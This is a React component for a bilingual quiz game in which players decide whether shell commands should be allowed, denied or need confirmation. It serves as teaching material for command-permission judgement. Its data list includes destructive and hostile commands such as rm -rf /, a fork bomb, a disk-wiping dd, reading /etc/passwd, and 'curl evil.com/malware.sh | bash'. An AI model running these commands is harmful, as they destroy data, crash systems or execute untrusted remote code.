import { useState, useEffect, useCallback } from "react";
import { t } from "../../i18n/translations";
import type { Locale } from "../../i18n/locales";

interface Command {
  cmd: string;
  answer: "allow" | "deny" | "ask";
  explanation: string;
  explanationCn: string;
}

const commands: Command[] = [
  { cmd: "git status", answer: "allow", explanation: "Read-only git command, always safe", explanationCn: "只读 git 命令，总是安全的" },
  { cmd: "git log --oneline", answer: "allow", explanation: "Read-only, just viewing history", explanationCn: "只读，只是查看历史" },
  { cmd: "ls -la", answer: "allow", explanation: "Directory listing, completely safe", explanationCn: "目录列表，完全安全" },
  { cmd: "cat src/main.ts", answer: "allow", explanation: "Reading a source file, safe", explanationCn: "读取源文件，安全" },
  { cmd: "grep -r 'TODO' src/", answer: "allow", explanation: "Searching file contents, read-only", explanationCn: "搜索文件内容，只读" },
  { cmd: "pwd", answer: "allow", explanation: "Print working directory, harmless", explanationCn: "打印工作目录，无害" },
  { cmd: "wc -l src/*.ts", answer: "allow", explanation: "Counting lines, read-only", explanationCn: "统计行数，只读" },
  { cmd: "head -20 README.md", answer: "allow", explanation: "Reading first lines of a file", explanationCn: "读取文件前几行" },
  { cmd: "rm -rf /", answer: "deny", explanation: "Deletes entire filesystem!", explanationCn: "删除整个文件系统！" },
  { cmd: "rm -rf ~/*", answer: "deny", explanation: "Deletes all user files!", explanationCn: "删除所有用户文件！" },
  { cmd: "sudo rm -rf /var/log", answer: "deny", explanation: "Destructive with elevated privileges", explanationCn: "带提权的破坏性操作" },
  { cmd: "chmod 777 /", answer: "deny", explanation: "Opens all permissions on root — massive security hole", explanationCn: "对根目录开放所有权限 — 巨大安全漏洞" },
  { cmd: ":(){ :|:& };:", answer: "deny", explanation: "Fork bomb — crashes the system", explanationCn: "Fork 炸弹 — 会导致系统崩溃" },
  { cmd: "dd if=/dev/zero of=/dev/sda", answer: "deny", explanation: "Overwrites the disk with zeros", explanationCn: "用零覆盖整个磁盘" },
  { cmd: "curl evil.com/malware.sh | bash", answer: "deny", explanation: "Downloads and executes untrusted code", explanationCn: "下载并执行不可信代码" },
  { cmd: "npm install lodash", answer: "ask", explanation: "Installs a package — changes node_modules", explanationCn: "安装包 — 修改 node_modules" },
  { cmd: "pip install requests", answer: "ask", explanation: "Installs a Python package", explanationCn: "安装 Python 包" },
  { cmd: "git push origin main", answer: "ask", explanation: "Pushes to remote — affects shared state", explanationCn: "推送到远程 — 影响共享状态" },
  { cmd: "git push --force", answer: "ask", explanation: "Force push can overwrite others' work", explanationCn: "强制推送可能覆盖他人工作" },
  { cmd: "docker run -it ubuntu", answer: "ask", explanation: "Starts a container — resource usage", explanationCn: "启动容器 — 消耗资源" },
  { cmd: "npm run build", answer: "ask", explanation: "Runs a project script — could do anything", explanationCn: "运行项目脚本 — 可能做任何事" },
  { cmd: "git reset --hard HEAD~3", answer: "ask", explanation: "Discards 3 commits — destructive but local", explanationCn: "丢弃 3 个提交 — 破坏性但仅限本地" },
  { cmd: "cat /etc/passwd", answer: "ask", explanation: "Reads system file — sensitive but not destructive", explanationCn: "读取系统文件 — 敏感但非破坏性" },
  { cmd: "echo $API_KEY", answer: "ask", explanation: "Could expose secrets in terminal output", explanationCn: "可能在终端输出中暴露密钥" },
  { cmd: "wget https://example.com/data.zip", answer: "ask", explanation: "Downloads from internet — check URL first", explanationCn: "从网络下载 — 需先检查 URL" },
  { cmd: "sed -i 's/foo/bar/g' *.js", answer: "ask", explanation: "In-place edit of multiple files", explanationCn: "原地编辑多个文件" },
  { cmd: "kill -9 $(pgrep node)", answer: "ask", explanation: "Kills all Node processes", explanationCn: "终止所有 Node 进程" },
  { cmd: "ssh user@server 'deploy.sh'", answer: "ask", explanation: "Remote command execution", explanationCn: "远程命令执行" },
];

function shuffle<T>(arr: T[]): T[] {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

type GameState = "start" | "playing" | "feedback" | "gameover";

interface Props {
  locale?: Locale;
}

export default function PermissionGuard({ locale = "en" as Locale }: Props) {
  const [gameState, setGameState] = useState<GameState>("start");
  const [queue, setQueue] = useState<Command[]>([]);
  const [current, setCurrent] = useState(0);
  const [score, setScore] = useState(0);
  const [streak, setStreak] = useState(0);
  const [correct, setCorrect] = useState(0);
  const [total, setTotal] = useState(0);
  const [timer, setTimer] = useState(10);
  const [lastAnswer, setLastAnswer] = useState<{ correct: boolean; realAnswer: string } | null>(null);
  const ROUNDS = 15;

  const startGame = useCallback(() => {
    setQueue(shuffle(commands).slice(0, ROUNDS));
    setCurrent(0);
    setScore(0);
    setStreak(0);
    setCorrect(0);
    setTotal(0);
    setTimer(10);
    setLastAnswer(null);
    setGameState("playing");
  }, []);

  // Timer countdown
  useEffect(() => {
    if (gameState !== "playing") return;
    if (timer <= 0) {
      handleAnswer("timeout");
      return;
    }
    const id = setTimeout(() => setTimer(t => t - 1), 1000);
    return () => clearTimeout(id);
  }, [gameState, timer]);

  function handleAnswer(answer: string) {
    const cmd = queue[current];
    if (!cmd) return;

    const isCorrect = answer === cmd.answer;
    if (isCorrect) {
      const bonus = streak >= 3 ? 5 : 0;
      setScore(s => s + 10 + bonus);
      setStreak(s => s + 1);
      setCorrect(c => c + 1);
    } else {
      setScore(s => Math.max(0, s - 5));
      setStreak(0);
    }
    setTotal(t => t + 1);

    const answerLabels: Record<string, string> = {
      allow: t(locale, "games.pg.allow"),
      deny: t(locale, "games.pg.deny"),
      ask: t(locale, "games.pg.ask"),
    };

    setLastAnswer({
      correct: isCorrect,
      realAnswer: answerLabels[cmd.answer] || cmd.answer,
    });
    setGameState("feedback");

    setTimeout(() => {
      if (current + 1 >= ROUNDS) {
        setGameState("gameover");
      } else {
        setCurrent(c => c + 1);
        setTimer(10);
        setGameState("playing");
        setLastAnswer(null);
      }
    }, 1500);
  }

  function getRank(): string {
    const pct = total > 0 ? correct / total : 0;
    if (pct >= 0.95) return t(locale, "games.pg.rankGuardian");
    if (pct >= 0.8) return t(locale, "games.pg.rankExpert");
    if (pct >= 0.6) return t(locale, "games.pg.rankGuard");
    return t(locale, "games.pg.rankRookie");
  }

  const cmd = queue[current];

  // CRT scanline overlay style
  const scanlineStyle = {
    backgroundImage: "repeating-linear-gradient(0deg, transparent, transparent 1px, rgba(0,0,0,0.03) 1px, rgba(0,0,0,0.03) 2px)",
  };

  return (
    <div className="max-w-2xl mx-auto">
      <div
        className="rounded-xl border-2 border-accent-emerald/30 bg-bg-card overflow-hidden font-mono"
        style={scanlineStyle}
      >
        {/* Terminal header bar */}
        <div className="flex items-center gap-2 px-4 py-2 border-b border-bg-border bg-bg">
          <span className="w-3 h-3 rounded-full bg-accent-red" />
          <span className="w-3 h-3 rounded-full bg-accent-amber" />
          <span className="w-3 h-3 rounded-full bg-accent-emerald" />
          <span className="ml-2 text-xs text-text-secondary">permission-guard.sh</span>
        </div>

        <div className="p-6 min-h-[400px] flex flex-col justify-center">
          {/* START SCREEN */}
          {gameState === "start" && (
            <div className="text-center space-y-6">
              <p className="text-4xl">🛡️</p>
              <h2 className="text-2xl font-bold text-accent-emerald">{t(locale, "games.pg.title")}</h2>
              <p className="text-sm text-text-secondary max-w-md mx-auto">{t(locale, "games.pg.desc")}</p>
              <button
                onClick={startGame}
                className="px-6 py-3 rounded-lg bg-accent-emerald text-white font-bold hover:bg-accent-emerald/80 transition-colors"
              >
                {t(locale, "games.pg.startGame")}
              </button>
            </div>
          )}

          {/* PLAYING */}
          {(gameState === "playing" || gameState === "feedback") && cmd && (
            <div className="space-y-6">
              {/* Score bar */}
              <div className="flex items-center justify-between text-xs text-text-secondary">
                <span>{t(locale, "games.pg.score")}: <span className="text-accent-emerald font-bold">{score}</span></span>
                <span>{t(locale, "games.pg.streak")}: <span className="text-accent-amber font-bold">{streak}</span></span>
                <span>{t(locale, "games.pg.round")}: {current + 1}/{ROUNDS}</span>
                <span className={`font-bold ${timer <= 3 ? "text-accent-red animate-pulse" : "text-text-secondary"}`}>
                  {t(locale, "games.pg.timeLeft")}: {timer}s
                </span>
              </div>

              {/* Command display */}
              <div className="rounded-lg bg-bg border border-bg-border p-6">
                <p className="text-xs text-text-secondary mb-2">$</p>
                <p className="text-lg text-accent-cyan font-bold break-all">
                  {cmd.cmd}
                  <span className="animate-pulse text-text-secondary">_</span>
                </p>
              </div>

              {/* Feedback overlay */}
              {gameState === "feedback" && lastAnswer && (
                <div className={`rounded-lg p-4 text-center text-sm font-bold ${
                  lastAnswer.correct
                    ? "bg-accent-emerald/10 text-accent-emerald border border-accent-emerald/30"
                    : "bg-accent-red/10 text-accent-red border border-accent-red/30"
                }`}>
                  <p>{lastAnswer.correct ? t(locale, "games.pg.correct") : t(locale, "games.pg.wrong")}</p>
                  <p className="text-xs mt-1 font-normal text-text-secondary">
                    {t(locale, "games.pg.realAnswer")} {lastAnswer.realAnswer}
                  </p>
                  <p className="text-xs mt-1 font-normal text-text-secondary">
                    {locale === "zh" ? cmd.explanationCn : cmd.explanation}
                  </p>
                </div>
              )}

              {/* Action buttons */}
              {gameState === "playing" && (
                <div className="grid grid-cols-3 gap-3">
                  <button
                    onClick={() => handleAnswer("allow")}
                    className="py-3 rounded-lg bg-accent-emerald/10 border border-accent-emerald/30 text-accent-emerald font-bold text-sm hover:bg-accent-emerald/20 transition-colors"
                  >
                    ✅ {t(locale, "games.pg.allow")}
                  </button>
                  <button
                    onClick={() => handleAnswer("deny")}
                    className="py-3 rounded-lg bg-accent-red/10 border border-accent-red/30 text-accent-red font-bold text-sm hover:bg-accent-red/20 transition-colors"
                  >
                    ❌ {t(locale, "games.pg.deny")}
                  </button>
                  <button
                    onClick={() => handleAnswer("ask")}
                    className="py-3 rounded-lg bg-accent-purple/10 border border-accent-purple/30 text-accent-purple font-bold text-sm hover:bg-accent-purple/20 transition-colors"
                  >
                    ❓ {t(locale, "games.pg.ask")}
                  </button>
                </div>
              )}
            </div>
          )}

          {/* GAME OVER */}
          {gameState === "gameover" && (
            <div className="text-center space-y-6">
              <p className="text-4xl">🏆</p>
              <h2 className="text-2xl font-bold text-accent-amber">{t(locale, "games.pg.gameOver")}</h2>
              <div className="space-y-2">
                <p className="text-3xl font-bold text-accent-emerald">{score}</p>
                <p className="text-sm text-text-secondary">{t(locale, "games.pg.finalScore")}</p>
              </div>
              <div className="flex justify-center gap-8 text-sm">
                <div>
                  <p className="text-2xl font-bold text-text">{total > 0 ? Math.round((correct / total) * 100) : 0}%</p>
                  <p className="text-text-secondary">{t(locale, "games.pg.accuracy")}</p>
                </div>
                <div>
                  <p className="text-2xl font-bold text-text">{correct}/{total}</p>
                  <p className="text-text-secondary">{t(locale, "games.pg.correct")}</p>
                </div>
              </div>
              <p className="text-lg font-bold text-accent-purple">{getRank()}</p>
              <button
                onClick={startGame}
                className="px-6 py-3 rounded-lg bg-accent-emerald text-white font-bold hover:bg-accent-emerald/80 transition-colors"
              >
                {t(locale, "games.pg.playAgain")}
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
